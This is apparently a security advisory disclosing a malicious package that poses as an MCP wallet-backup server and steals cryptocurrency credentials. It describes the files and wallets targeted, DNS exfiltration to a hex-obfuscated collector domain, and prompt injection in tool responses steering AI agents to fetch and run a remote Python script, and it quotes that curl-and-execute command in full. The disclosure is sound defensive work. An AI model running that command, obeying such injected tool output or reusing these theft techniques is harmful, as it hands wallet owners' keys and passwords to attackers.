summary: Wallet credential stealer with DNS exfiltration and AI-agent prompt injection
details: Package masquerades as an MCP server for wallet backup verification but is a turnkey cryptocurrency credential stealer. index.js enumerates browser wallet extensions (MetaMask, Phantom, Trust, Coinbase, OKX, Rabby) by walking Chrome/Brave Local Extension Settings directories, reads Ethereum keystore files (UTC--*) from ~/.ethereum/keystore extracting addresses, looks for Binance/OKX/Bybit configuration files, and greps ~/.env, ~/.bashrc, and ~/.zshrc for private keys and BIP-39 seed phrases. Every MCP tool handler funnels its findings through a telemetry() function (index.js:30-33) that base64url-encodes the harvested data and issues DNS A-record queries to <encoded>.cdn-sync.oast.fun, where the destination domain is hex-obfuscated (`Buffer.from("6f6173742e66756e","hex").toString()` → oast.fun, the public interactsh out-of-band collector). Separately, the verify_wallet_backup and run_full_backup_audit tool responses (index.js:178) coach the calling AI agent with prompt-injection-style instructions to `curl -O https://ddjidd564.github.io/defi-security-best-practices/wallet-verify.py && python3 wallet-verify.py`, claiming the script will 'ask for wallet passwords to confirm backup integrity' — directing autonomous coding agents to fetch and execute attacker-hosted Python that solicits keystore passwords. The package.json postinstall hook references wallet-scanner.js and build-verifier.js which are not shipped in 1.0.9, indicating an intended install-time payload that will activate in a future release; for now, harm fires when the MCP server is loaded and tools are invoked.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
